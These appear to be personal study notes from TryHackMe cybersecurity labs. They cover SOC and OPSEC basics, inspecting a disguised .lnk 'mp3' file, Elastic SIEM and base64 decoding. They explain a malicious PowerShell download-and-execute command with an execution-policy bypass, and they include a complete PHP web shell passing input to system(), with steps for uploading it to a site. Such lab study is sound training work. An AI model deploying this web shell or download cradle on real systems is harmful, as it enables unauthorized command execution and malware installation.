##### **Security Operations Center (SOC)** 
It is a team of IT security professionals tasked with monitoring, preventing , detecting , investigating, and responding to threats within a company’s network and systems.

##### Operational Security (OPSEC) 
It is a set of principals and tactics used to attempt to protect the security of an operator or operation. An example of this may be using code names instead of your real names, or using a proxy to conceal your IP address.
##### File Command
```shell-session
user@tryhackme:~$ file song.mp3
download.mp3: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
```


```shell-session
user@tryhackme:~$ file somg.mp3
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Archive, ctime=Sat Sep 15 07:14:14 2018, mtime=Sat Sep 15 07:14:14 2018, atime=Sat Sep 15 07:14:14 2018, length=448000, window=hide
```

Here, MS Windows shortcut = .lnk file::

##### Exiftool
``` shell
user@tryhackme:~$ exiftool somg.mp3
``` 
![[Pasted image 20241208123022.png]]
![[Pasted image 20241208130704.png]]
What this PowerShell command does:

- The `-ep Bypass -nop` flags disable PowerShell's usual restrictions, allowing scripts to run without interference from security settings or user profiles.
- The `DownloadFile` method pulls a file (in this case, `IS.ps1`) from a remote server ([https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1](https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1)) and saves it in the `C:\\ProgramData\\` directory on the target machine.
- Once downloaded, the script is executed with PowerShell using the `iex` command, which triggers the downloaded `s.ps1` file.

If you visit the contents of the file to be downloaded using your browser (`https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1`), you will see just how lucky we are that we are not currently using Windows.

##### ELASTIC SIEM
Elastic SIEM is a security information and event management platform that helps organizations detect, investigate, and respond to security threats. It aggregates and analyzes data from various sources to provide real-time insights and alerts on potential security incidents.
Elastic Security SIEM (Security Information and Event Management) is a product built on top of the Elastic Stack, which provides security insights and real-time threat detection. 

###### base64 commands

![[Pasted image 20241208144057.png]]
``` shell
┌──(root㉿kali)-[~/Desktop/THM]
└─# echo SQBuAHMAdABhAGwAbAAtAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUAIAAtAEEAYwBjAGUAcAB0AEEAbABsACAALQBBAHUAdABvAFIAZQBiAG8AbwB0AA== | base64 --decode
Install-WindowsUpdate -AcceptAll -AutoReboot 
```   

###### PHP File Upload
```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```
If we add above command in a file and upload it to the website and later navigate to the uploaded directory, it gives command injection tab where we can input the commands like below:
![[Pasted image 20241225122355.png]]